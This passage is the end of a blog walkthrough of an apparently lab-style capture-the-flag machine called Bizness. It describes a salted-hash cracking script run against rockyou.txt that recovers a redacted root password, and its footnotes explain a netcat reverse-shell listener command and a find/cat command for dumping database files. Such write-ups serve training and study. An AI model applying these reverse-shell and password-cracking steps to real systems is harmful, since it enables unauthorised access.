</code></pre></div></div> <p>This script reads through a list of potential passwords (<code class="language-plaintext highlighter-rouge">rockyou.txt</code>), hashes each one using the specified algorithm and salt, and then compares the resulting hash to a target hash. If a match is found, it prints the plaintext password along with its hash.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$python3</span> solve.py 
Found Password:REDACTED, <span class="nb">hash</span>:<span class="nv">$SHA1$d$uP0_QaVBpDWFeo8</span><span class="nt">-REDACTED</span><span class="o">=</span>

</code></pre></div></div> <p>Switching to <code class="language-plaintext highlighter-rouge">root</code> and trying the password works, and the root flag is obtained.</p> <p><img src="/assets/img/20240123-bizness/20240123-rootflag.png" alt="20240123-rootflag.png" class="auto-resize"></p> <h1 id="footnotes">Footnotes</h1> <ol> <li id="note1"> <a href="#ref1">↩</a> The command <code>rlwrap -cAr nc -lvnp 9010</code> is a combination of several utilities and options that are commonly used in reverse shell setups. Here's a breakdown of the command: <ul> <li> <strong><code>rlwrap</code></strong>: <ul> <li>This is a utility that provides readline capabilities to commands that may not have them. Readline allows for command line editing, persistent history, and auto-completion. In the context of this command, <code>rlwrap</code> is used to enhance the functionality of <code>nc</code> (Netcat).</li> </ul> </li> <li> <strong><code>-cAr</code></strong>: These are options for <code>rlwrap</code>: <ul> <li> <code>-c</code>: Enables command completion.</li> <li> <code>-A</code>: Enables command auto-completion.</li> <li> <code>-r</code>: Keeps a history of commands.</li> </ul> </li> <li> <strong><code>-lvnp 4321</code></strong>: These are options for <code>nc</code>: <ul> <li> <code>-l</code>: Puts Netcat into listening mode, where it waits for incoming connections.</li> <li> <code>-v</code>: Verbose mode. Netcat will provide more information about what it's doing.</li> <li> <code>-n</code>: No DNS. Tells Netcat not to resolve hostnames via DNS. This can speed up operations if DNS resolution is not required.</li> <li> <code>-p 4321</code>: Specifies the port number on which Netcat will listen for incoming connections.</li> </ul> </li> </ul> So, putting it all together, <code>rlwrap -cAr nc -lvnp 4321</code> runs Netcat in listening mode on port 4321 with enhanced readline capabilities provided by <code>rlwrap</code>. This setup is typically used when you're expecting to receive a reverse shell, and you want the ability to interact with that shell more effectively using command history and completion. </li> <li id="note2"> <a href="#ref2">↩</a> <ul> <li> <strong><code>find seg0 -type f</code></strong>: <ul> <li> <code>find</code>: This is a command used to search for files in a directory hierarchy.</li> <li> <code>seg0</code>: This specifies the directory where the <code>find</code> command starts its search. In this case, it's looking in the <code>seg0</code> directory.</li> <li> <code>-type f</code>: This option tells <code>find</code> to look for files (not directories).</li> </ul> </li> <li> <strong><code>-exec cat {} \;</code></strong>: <ul> <li> <code>-exec</code>: This option of the <code>find</code> command allows you to execute another command on each of the files found.</li> <li> <code>cat {}</code>: This is the command that <code>find</code> will execute on each file. <code>cat</code> is a standard Unix utility that reads files and outputs their content. The <code>{}</code> is a placeholder for each file <code>find</code> locates.</li> <li> <code>\;</code>: This is a delimiter that indicates the end of the <code>exec</code> command.</li> </ul> </li> <li> <strong><code>&gt; dir.txt</code></strong>: <ul> <li> <code>&gt;</code>: This is an output redirection operator in Unix/Linux. It directs the output from the preceding command to a file.</li> <li> <code>dir.txt</code>: This is the file into which the output of the previous commands will be saved.</li> </ul> </li> </ul> </li> </ol> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/hospital-walkthrough/">Hospital - Insecure File Uploads, Business Email Compromise, and kernel exploits.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/headleass-walkthrough/">Headless - XSS, Command Injection, and Sudo abuse.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/codify-walkthrough/">Codify - Arbitraty code execution and stealing hashes.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/devvortex-walkthrough/">Devvortex - Unauthenticated Information Disclosure and password re-use.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/pilgrimage-write-up/">Pilgrimage - Arbitrary File Reads and Local File Inclusions.</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2024 . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?7b30caa5023af4af8408a472dc4e1ebb"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script defer src="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){window.dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>